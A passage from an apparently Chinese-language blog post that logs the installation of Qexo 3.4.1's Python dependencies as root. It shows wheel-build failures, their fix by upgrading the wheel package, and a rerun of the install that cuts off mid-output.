distutils.core.setup(**attrs)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/core.py&quot;</span>, line 170, <span class="hljs-keyword">in</span> setup<br>          ok = dist.parse_command_line()<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 472, <span class="hljs-keyword">in</span> parse_command_line<br>          args = self._parse_command_opts(parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 901, <span class="hljs-keyword">in</span> _parse_command_opts<br>          nargs = _Distribution._parse_command_opts(self, parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 531, <span class="hljs-keyword">in</span> _parse_command_opts<br>          cmd_class = self.get_command_class(<span class="hljs-built_in">command</span>)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 738, <span class="hljs-keyword">in</span> get_command_class<br>          from .command.bdist_wheel import bdist_wheel<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/command/bdist_wheel.py&quot;</span>, line 26, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          from wheel.wheelfile import WheelFile<br>      ModuleNotFoundError: No module named <span class="hljs-string">&#x27;wheel.wheelfile&#x27;</span><br>      [end of output]<br>  <br>  note: This error originates from a subprocess, and is likely not a problem with pip.<br>  ERROR: Failed building wheel <span class="hljs-keyword">for</span> upyun<br>  Running setup.py clean <span class="hljs-keyword">for</span> upyun<br>  Building wheel <span class="hljs-keyword">for</span> aliyun-python-sdk-core (setup.py) ... error<br>  error: subprocess-exited-with-error<br>  <br>  × python setup.py bdist_wheel did not run successfully.<br>  │ <span class="hljs-built_in">exit</span> code: 1<br>  ╰─&gt; [21 lines of output]<br>      Warning: <span class="hljs-string">&#x27;classifiers&#x27;</span> should be a list, got <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span><br>      Traceback (most recent call last):<br>        File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line 2, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;&lt;pip-setuptools-caller&gt;&quot;</span>, line 34, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;/tmp/pip-install-y1qa10vz/aliyun-python-sdk-core_6b94c9a9d0b64068a5e4eb579e9dd07b/setup.py&quot;</span>, line 82, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          setup(name=<span class="hljs-string">&#x27;aliyun-python-sdk-core&#x27;</span>, **setup_args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/__init__.py&quot;</span>, line 117, <span class="hljs-keyword">in</span> setup<br>          <span class="hljs-built_in">return</span> distutils.core.setup(**attrs)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/core.py&quot;</span>, line 170, <span class="hljs-keyword">in</span> setup<br>          ok = dist.parse_command_line()<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 472, <span class="hljs-keyword">in</span> parse_command_line<br>          args = self._parse_command_opts(parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 901, <span class="hljs-keyword">in</span> _parse_command_opts<br>          nargs = _Distribution._parse_command_opts(self, parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 531, <span class="hljs-keyword">in</span> _parse_command_opts<br>          cmd_class = self.get_command_class(<span class="hljs-built_in">command</span>)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 738, <span class="hljs-keyword">in</span> get_command_class<br>          from .command.bdist_wheel import bdist_wheel<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/command/bdist_wheel.py&quot;</span>, line 26, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          from wheel.wheelfile import WheelFile<br>      ModuleNotFoundError: No module named <span class="hljs-string">&#x27;wheel.wheelfile&#x27;</span><br>      [end of output]<br>  <br>  note: This error originates from a subprocess, and is likely not a problem with pip.<br>  ERROR: Failed building wheel <span class="hljs-keyword">for</span> aliyun-python-sdk-core<br>  Running setup.py clean <span class="hljs-keyword">for</span> aliyun-python-sdk-core<br>  Building wheel <span class="hljs-keyword">for</span> crcmod (setup.py) ... error<br>  error: subprocess-exited-with-error<br>  <br>  × python setup.py bdist_wheel did not run successfully.<br>  │ <span class="hljs-built_in">exit</span> code: 1<br>  ╰─&gt; [37 lines of output]<br>      Traceback (most recent call last):<br>        File <span class="hljs-string">&quot;/tmp/pip-install-y1qa10vz/crcmod_0f0ce0da6c6b415fb56a5a6b682c5c09/setup.py&quot;</span>, line 58, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          setup(**setup_dict)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/core.py&quot;</span>, line 170, <span class="hljs-keyword">in</span> setup<br>          ok = dist.parse_command_line()<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 472, <span class="hljs-keyword">in</span> parse_command_line<br>          args = self._parse_command_opts(parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 901, <span class="hljs-keyword">in</span> _parse_command_opts<br>          nargs = _Distribution._parse_command_opts(self, parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 531, <span class="hljs-keyword">in</span> _parse_command_opts<br>          cmd_class = self.get_command_class(<span class="hljs-built_in">command</span>)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 738, <span class="hljs-keyword">in</span> get_command_class<br>          from .command.bdist_wheel import bdist_wheel<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/command/bdist_wheel.py&quot;</span>, line 26, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          from wheel.wheelfile import WheelFile<br>      ModuleNotFoundError: No module named <span class="hljs-string">&#x27;wheel.wheelfile&#x27;</span><br>      <br>      During handling of the above exception, another exception occurred:<br>      <br>      Traceback (most recent call last):<br>        File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line 2, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;&lt;pip-setuptools-caller&gt;&quot;</span>, line 34, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;/tmp/pip-install-y1qa10vz/crcmod_0f0ce0da6c6b415fb56a5a6b682c5c09/setup.py&quot;</span>, line 66, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          setup(**setup_dict)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/core.py&quot;</span>, line 170, <span class="hljs-keyword">in</span> setup<br>          ok = dist.parse_command_line()<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 472, <span class="hljs-keyword">in</span> parse_command_line<br>          args = self._parse_command_opts(parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 901, <span class="hljs-keyword">in</span> _parse_command_opts<br>          nargs = _Distribution._parse_command_opts(self, parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 531, <span class="hljs-keyword">in</span> _parse_command_opts<br>          cmd_class = self.get_command_class(<span class="hljs-built_in">command</span>)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 738, <span class="hljs-keyword">in</span> get_command_class<br>          from .command.bdist_wheel import bdist_wheel<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/command/bdist_wheel.py&quot;</span>, line 26, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          from wheel.wheelfile import WheelFile<br>      ModuleNotFoundError: No module named <span class="hljs-string">&#x27;wheel.wheelfile&#x27;</span><br>      [end of output]<br>  <br>  note: This error originates from a subprocess, and is likely not a problem with pip.<br>  ERROR: Failed building wheel <span class="hljs-keyword">for</span> crcmod<br>  Running setup.py clean <span class="hljs-keyword">for</span> crcmod<br>Failed to build oss2 upyun aliyun-python-sdk-core crcmod<br>ERROR: ERROR: Failed to build installable wheels <span class="hljs-keyword">for</span> some pyproject.toml based projects (oss2, upyun, aliyun-python-sdk-core, crcmod)<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="小插曲：重新安装wheel"><a href="#小插曲：重新安装wheel" class="headerlink" title="小插曲：重新安装wheel"></a>小插曲：重新安装wheel</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install --upgrade --force-reinstall wheel</span><br>Collecting wheel<br>  Downloading wheel-0.44.0-py3-none-any.whl.metadata (2.3 kB)<br>Downloading wheel-0.44.0-py3-none-any.whl (67 kB)<br>WARNING: Error parsing dependencies of bcc: Invalid version: <span class="hljs-string">&#x27;0.24.0-8f40d6f5&#x27;</span><br>WARNING: Error parsing dependencies of distro-info: Invalid version: <span class="hljs-string">&#x27;0.18ubuntu0.18.04.1&#x27;</span><br>Installing collected packages: wheel<br>  Attempting uninstall: wheel<br>    Found existing installation: wheel 0.30.0<br>    Uninstalling wheel-0.30.0:<br>      Successfully uninstalled wheel-0.30.0<br>Successfully installed wheel-0.44.0<br>WARNING: Running pip as the <span class="hljs-string">&#x27;root&#x27;</span> user can result <span class="hljs-keyword">in</span> broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable.It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option <span class="hljs-keyword">if</span> you know what you are doing and want to suppress this warning.<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="回到主线-5"><a href="#回到主线-5" class="headerlink" title="回到主线"></a>回到主线</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install -r requirements.txt</span><br>Collecting Django==3.2.25 (from -r requirements.txt (line 1))<br>  Using cached Django-3.2.25-py3-none-any.whl.metadata (4.1 kB)<br>Collecting PyMySQL==1.0.2 (from -r requirements.txt (line 2))<br>  Using cached PyMySQL-1.0.2-py3-none-any.whl.metadata (5.1 kB)<br>Collecting boto3==1.34.44 (from -r requirements.txt (line 3))<br>  Using cached boto3-1.34.44-py3-none-any.whl.metadata (6.6 kB)<br>Collecting requests==2.31.0 (from -r requirements.txt (line 4))<br>  Using cached requests-2.31.0-py3-none-any.whl.metadata (4.6 kB)<br>Collecting PyGithub==2.2.0 (from -r requirements.txt (line 5))<br>  Using cached PyGithub-2.2.0-py3-none-any.whl.metadata (3.8 kB)<br>Collecting python-gitlab==4.4.0 (from -r requirements.txt (line 6))<br>  Using cached python_gitlab-4.4.0-py3-none-any.whl.metadata (7.7 kB)<br>Collecting html2text==2020.1.16 (from -r requirements.txt (line 7))<br>  Using cached html2text-2020.1.16-py3-none-any.whl.metadata (4.3 kB)<br>Collecting PyYAML==6.0.1 (from -r requirements.txt (line 8))<br>  Using cached PyYAML-6.0.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (2.1 kB)<br>Collecting urllib3==1.26.18 (from -r requirements.txt (line 9))<br>  Using cached urllib3-1.26.18-py2.py3-none-any.whl.metadata (48 kB)<br>Collecting Markdown==3.5.2 (from -r requirements.txt (line 10))<br>  Using cached Markdown-3.5.2-py3-none-any.whl.metadata (7.0 kB)<br>Collecting djongo5==1.3.9 (from -r requirements.txt (line 11))<br>  Using cached djongo5-1.3.9-py3-none-any.whl.metadata (1.9 kB)<br>Collecting django-cors-headers==4.1.0 (from -r requirements.txt (line 12))<br>  Using cached django_cors_headers-4.1.0-py3-none-any.whl.metadata (16 kB)<br>Collecting pymongo==3.13.0 (from -r requirements.txt (line 13))<br>  Using cached pymongo-3.13.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (9.7 kB)<br>Collecting dnspython==2.2.1 (from -r requirements.txt (line 14))<br>  Using cached dnspython-2.2.1-py3-none-any.whl.metadata (4.9 kB)<br>Collecting sqlparse==0.2.4 (from -r requirements.txt (line 15))<br>  Using cached sqlparse-0.2.4-py2.py3-none-any.whl.metadata (2.2 kB)<br>Collecting psycopg2-binary==2.9.9 (from -r requirements.txt (line 16))<br>  Using cached psycopg2_binary-2.9.9-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.4 kB)<br>Requirement already satisfied: cryptography==42.0.4 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from -r requirements.txt (line 17)) (42.0.4)<br>Collecting pyopenssl==24.0.0 (from -r requirements.txt (line 18))<br>  Using cached pyOpenSSL-24.0.0-py3-none-any.whl.metadata (12 kB)<br>Collecting oss2==2.18.4 (from -r requirements.txt (line 19))<br>  Using cached oss2-2.18.4.tar.gz (278 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting beautifulsoup4==4.12.3 (from -r requirements.txt (line 20))<br>  Using cached beautifulsoup4-4.12.3-py3-none-any.whl.metadata (3.8 kB)<br>Collecting upyun==2.5.5 (from -r requirements.txt (line 21))<br>  Using cached upyun-2.5.5.tar.gz (19 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting asgiref&lt;4,&gt;=3.3.2 (from Django==3.2.25-&gt;-r requirements.txt (line 1))<br>  Using cached asgiref-3.8.1-py3-none-any.whl.metadata (9.3 kB)<br>Requirement already satisfied: pytz <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from Django==3.2.25-&gt;-r requirements.txt (line 1)) (2018.3)<br>Collecting botocore&lt;1.35.0,&gt;=1.34.44 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached botocore-1.34.162-py3-none-any.whl.metadata (5.7 kB)<br>Collecting jmespath&lt;2.0.0,&gt;=0.7.1 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached jmespath-1.0.1-py3-none-any.whl.metadata (7.6 kB)<br>Collecting s3transfer&lt;0.11.0,&gt;=0.10.0 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached s3transfer-0.10.3-py3-none-any.whl.metadata (1.7 kB)<br>Collecting charset-normalizer&lt;4,&gt;=2 (from requests==2.31.0-&gt;-r requirements.txt (line 4))<br>  Using cached charset_normalizer-3.4.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (34 kB)<br>Requirement already satisfied: idna&lt;4,&gt;=2.5 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from requests==2.31.0-&gt;-r requirements.txt (line 4)) (2.6)<br>Requirement already satisfied: certifi&gt;=2017.4.17 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from requests==2.31.0-&gt;-r requirements.txt (line 4)) (2018.1.18)<br>Collecting pynacl&gt;=1.4.0 (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl.metadata (8.6 kB)<br>Collecting pyjwt&gt;=2.4.0 (from pyjwt[crypto]&gt;=2.4.0-&gt;PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached PyJWT-2.9.0-py3-none-any.whl.metadata (3.0 kB)<br>Collecting typing-extensions&gt;=4.0.0 (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached typing_extensions-4.12.2-py3-none-any.whl.metadata (3.0 kB)<br>Collecting Deprecated (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached Deprecated-1.2.14-py2.py3-none-any.whl.metadata (5.4 kB)<br>Collecting requests-toolbelt&gt;=0.10.1 (from python-gitlab==4.4.0-&gt;-r requirements.txt (line 6))<br>  Using cached requests_toolbelt-1.0.0-py2.py3-none-any.whl.metadata (14 kB)<br>Collecting importlib-metadata&gt;=4.4 (from Markdown==3.5.2-&gt;-r requirements.txt (line 10))<br>  Using cached importlib_metadata-8.5.0-py3-none-any.whl.metadata (4.8 kB)<br>Collecting pytz (from Django==3.2.25-&gt;-r requirements.txt (line 1))<br>  Using cached pytz-2024.2-py2.py3-none-any.whl.metadata (22 kB)<br>Requirement already satisfied: cffi&gt;=1.12 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from cryptography==42.0.4-&gt;-r requirements.txt (line 17)) (1.17.1)<br>Collecting crcmod&gt;=1.7 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached crcmod-1.7.tar.gz (89 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting pycryptodome&gt;=3.4.7 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)<br>Collecting aliyun-python-sdk-kms&gt;=2.4.1 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached aliyun_python_sdk_kms-2.16.5-py2.py3-none-any.whl.metadata (1.5 kB)<br>Collecting aliyun-python-sdk-core&gt;=2.13.12 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached aliyun-python-sdk-core-2.16.0.tar.gz (449 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting six (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached six-1.16.0-py2.py3-none-any.whl.metadata (1.8 kB)<br>Collecting soupsieve&gt;1.2 (from beautifulsoup4==4.12.3-&gt;-r requirements.txt (line 20))<br>  Using cached soupsieve-2.6-py3-none-any.whl.metadata (4.6 kB)<br>Collecting jmespath&lt;2.0.0,&gt;=0.7.1 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached jmespath-0.10.0-py2.py3-none-any.whl.metadata (8.0 kB)<br>Requirement already satisfied: python-dateutil&lt;3.0.0,&gt;=2.1 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from botocore&lt;1.35.0,&gt;=1.34.44-&gt;boto3==1.34.44-&gt;-r requirements.txt (line 3)) (2.6.1)<br>Requirement already satisfied: pycparser <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from cffi&gt;=1.12-&gt;cryptography==42.0.4-&gt;-r requirements.txt (line 17)) (2.22)<br>Collecting zipp&gt;=3.20 (from importlib-metadata&gt;=4.4-&gt;Markdown==3.5.2-&gt;-r requirements.txt (line 10))<br>  Using cached zipp-3.20.2-py3-none-any.whl.metadata (3.7 kB)<br>Collecting wrapt&lt;2,&gt;=1.10 (from Deprecated-&gt;PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached wrapt-1.16.0-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (6.6 kB)<br>Using cached Django-3.2.25-py3-none-any.whl (7.9 MB)<br>Using cached PyMySQL-1.0.2-py3-none-any.whl (43 kB)<br>Using cached boto3-1.34.44-py3-none-any.whl (139 kB)<br>Using cached requests-2.31.0-py3-none-any.whl (62 kB)<br>Using cached PyGithub-2.2.0-py3-none-any.whl (350 kB)<br>Using cached python_gitlab-4.4.0-py3-none-any.whl (138 kB)<br>Using cached html2text-2020.1.16-py3-none-any.whl (32 kB)<br>Using cached PyYAML-6.0.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (736 kB)<br>Using cached urllib3-1.26.18-py2.py3-none-any.whl (143 kB)<br>Using cached Markdown-3.5.2-py3-none-any.whl (103 kB)<br>Using cached djongo5-1.3.9-py3-none-any.whl (51 kB)<br>Using cached django_cors_headers-4.1.0-py3-none-any.whl (12 kB)<br>Using cached pymongo-3.13.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (526 kB)<br>Using cached dnspython-2.2.1-py3-none-any.whl (269 kB)<br>Using cached sqlparse-0.2.4-py2.py3-none-any.whl (38 kB)<br>Using cached psycopg2_binary-2.9.9-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (3.0 MB)<br>Using cached pyOpenSSL-24.0.0-py3-none-any.whl (58 kB)<br>Using cached beautifulsoup4-4.12.3-py3-none-any.whl (147 kB)<br>Using cached aliyun_python_sdk_kms-2.16.5-py2.py3-none-any.whl (99 kB)<br>Using cached asgiref-3.8.1-py3-none-any.whl (23 kB)<br>Using cached botocore-1.34.162-py3-none-any.whl (12.5 MB)<br>Using cached charset_normalizer-3.4.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (143 kB)<br>Using cached importlib_metadata-8.5.0-py3-none-any.whl (26 kB)<br>Using cached jmespath-0.10.0-py2.py3-none-any.whl (24 kB)<br>Using cached pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)<br>Using cached PyJWT-2.9.0-py3-none-any.whl (22 kB)<br>Using cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl (856 kB)<br>Using cached pytz-2024.2-py2.py3-none-any.whl (508 kB)<br>Using cached requests_toolbelt-1.0.0-py2.py3-none-any.whl (54 kB)<br>Using cached s3transfer-0.10.3-py3-none-any.whl (82 kB)<br>Using cached soupsieve-2.6-py3-none-any.whl (36 kB)<br>Using cached typing_extensions-4.12.2-py3-none-any.whl (37 kB)<br>Using cached Deprecated-1.2.14-py2.py3-none-any.whl (9.6 kB)<br>Using cached six-1.16.0-py2.py3-none-any.whl (11 kB)<br>Using cached wrapt-1.16.0-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (83 kB)<br>Using cached zipp-3.20.2-py3-none-any.whl (9.2 kB)<br>Building wheels <span class="hljs-keyword">for</span> collected packages: oss2, upyun, aliyun-python-sdk-core, crcmod<br>  Building wheel <span class="hljs-keyword">for</span> oss2 (setup.py) ... <span class="hljs-keyword">done</span><br>  Created wheel <span class="hljs-keyword">for</span> oss2: filename=oss2-2.18.4-py3-none-any.whl size=115940 sha256=1e38b5d46faf1f72351842cf111b0339af5611aeeae29c8d5c7189f23baabc12<br>  Stored <span class="hljs-keyword">in</span> directory: /root/.cache/pip/wheels/3d/7e/b4/d1ddfa5624c5720f3bac0e73c058d7d16ca4ebdb28bc11b5cd<br>  Building wheel <span class="hljs-keyword">for</span> upyun (setup.py) ... <span class="hljs-keyword">done</span><br>  Created wheel <span class="hljs-keyword">for</span> upyun: filename=upyun-2.5.5-py3-none-any.whl size=17516 sha256=451e4043a0d309489c7c143a23c42c7f5507e431f5e647907ea5f3284f98ad2c<br>  Stored <span class="hljs-keyword">in</span> directory: /root/.cache/pip/wheels/80/49/84/6efc7937d178d60303b1a9c690fd293a5e193ebfa29b3513c6<br>  Building wheel <span class="hljs-keyword">for</span> aliyun-python-sdk-core (setup.py) ... <span class="hljs-keyword">done</span><br>  Created wheel <span class="hljs-keyword">for</span> aliyun-python-sdk-core: filename=aliyun_python_sdk_core-2.16.0-py3-none-any.whl size=535316 sha256=5e3db57da23072088b4c7f0430edc04f0c64668cc5a48b9bb5aa721c8f319a2c<br>  Stored <span class="hljs-keyword">in</span> directory: /root/.cache/pip/wheels/b2/49/69/4ff7cddf922bb14b3cd172290d83582ec72051d43333e70b69<br>  Building wheel <span class="hljs-keyword">for</span> crcmod (setup.py) ... <span class="hljs-keyword">done</span><br>  Created wheel <span class="hljs-keyword">for</span> crcmod: filename=crcmod-1.7-py3-none-any.whl size=18834 sha256=08d9dbc9269059696c5df9c187ea5d5f1c120ecfa265719e92757291401d7c2e<br>  Stored <span class="hljs-keyword">in</span> directory: /root/.cache/pip/wheels/ca/5a/02/f3acf982a026f3319fb3e798a8dca2d48fafee7761788562e9<br>Successfully built oss2 upyun aliyun-python-sdk-core crcmod<br>WARNING: Error parsing dependencies of bcc: Invalid version: <span class="hljs-string">&#x27;0.24.0-8f40d6f5&#x27;</span><br>WARNING: Error parsing dependencies of distro-info: Invalid version: <span class="hljs-string">&#x27;0.18ubuntu0.18.04.1&#x27;</span><br>Installing collected packages: sqlparse, pytz, crcmod, zipp, wrapt, urllib3, typing-extensions, soupsieve, six, PyYAML, PyMySQL, pymongo, pyjwt, pycryptodome, psycopg2-binary, jmespath, html2text, dnspython, charset-normalizer, requests, pynacl, importlib-metadata, Deprecated, botocore, beautifulsoup4, asgiref, upyun, s3transfer, requests-toolbelt, pyopenssl, Markdown, Django, aliyun-python-sdk-core, python-gitlab, PyGithub, djongo5, django-cors-headers, boto3, aliyun-python-sdk-kms, oss2<br>  Attempting uninstall: pytz<br>    Found existing installation: pytz 2018.3<br>    Uninstalling pytz-2018.3:<br>      Successfully uninstalled pytz-2018.3<br>  Attempting uninstall: PyYAML<br>    Found existing installation: PyYAML 3.12<br>error: 